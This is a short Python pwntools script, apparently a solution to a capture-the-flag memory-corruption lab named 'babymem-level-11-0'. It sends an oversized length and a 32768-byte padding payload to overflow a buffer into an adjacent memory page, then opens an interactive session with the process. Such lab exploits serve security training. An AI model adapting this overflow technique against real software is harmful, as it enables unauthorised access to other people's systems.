from pwn import *


proc = process('/challenge/babymem-level-11-0')
proc.recv()
# Use size to overwrite offset memory page (mmap)
size = 32768
proc.sendline(str(size).encode())
print(proc.recv())
payload = b'A' * size
proc.sendline(payload)
proc.interactive()
